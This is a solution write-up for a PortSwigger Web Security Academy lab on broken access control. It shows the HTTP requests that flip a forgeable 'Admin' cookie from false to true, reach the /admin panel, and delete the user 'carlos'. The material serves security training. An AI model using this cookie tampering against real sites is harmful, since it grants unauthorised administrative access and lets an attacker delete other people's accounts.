# [Lab 3: User role controlled by request parameter](https://portswigger.net/web-security/access-control/lab-user-role-controlled-by-request-parameter)

---

## Description

This lab has an admin panel at `/admin`, which identifies administrators using a forgeable cookie.

Solve the lab by accessing the admin panel and using it to delete the user `carlos`.

You can log in to your own account using the following credentials: `wiener:peter`

---

## Solution

After successfully logging into the application with the non-administrative credentials `wiener:peter`, the application returned this response.

```http
HTTP/1.1 302 Found
Location: /my-account
Set-Cookie: Admin=false; Secure; HttpOnly
Set-Cookie: session=ELmcg8mZYTqmUDXvCGh0OBEZchW2O5GS; Secure; HttpOnly; SameSite=None
Connection: close
Content-Length: 0
```

It sets two cookies: `session` and `Admin`. Generally, the `session` cookie would be associated with `wiener`'s user account on the backend and the application would check, with each request, whether or not `wiener` has access to the desired resource.

However, this application appears to track whether or not the current user has access to administrative functionality (i.e., the `/admin` panel) via the `Admin` cookie.

Request access to `/admin` with the `Admin` cookie set to `true`.

```http
GET /admin HTTP/1.1
Host: ac171f211fde6d3680e996dc009c00a9.web-security-academy.net
Cookie: session=ELmcg8mZYTqmUDXvCGh0OBEZchW2O5GS; Admin=true
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Dnt: 1
Upgrade-Insecure-Requests: 1
Sec-Gpc: 1
Te: trailers
Connection: close
```

This grants access to the administrator panel. Delete `carlos` with the `Admin` flag set to `true` to complete the challenge.

```http
GET /admin/delete?username=carlos HTTP/1.1
Host: ac171f211fde6d3680e996dc009c00a9.web-security-academy.net
Cookie: session=ELmcg8mZYTqmUDXvCGh0OBEZchW2O5GS; Admin=true
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Dnt: 1
Upgrade-Insecure-Requests: 1
Sec-Gpc: 1
Te: trailers
Connection: close
```
